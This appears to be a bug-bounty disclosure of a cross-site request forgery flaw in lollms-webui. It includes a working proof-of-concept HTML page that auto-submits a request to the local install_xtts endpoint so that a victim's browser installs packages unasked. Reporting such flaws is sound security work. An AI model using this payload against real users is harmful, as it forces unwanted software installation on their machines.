Title: CSRF in Servers Configurations in parisneo/lollms-webui

Proof of Concept: 
Step 1:The attacker sends a fake install_xtts installation form to the victim.

<html>

  <body>
    <form action="http://localhost:9600/install_xtts">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

Step 2:User clicks, installs install_xtts and unwanted packages

Impact: 
Attackers trick users into performing actions they do not want
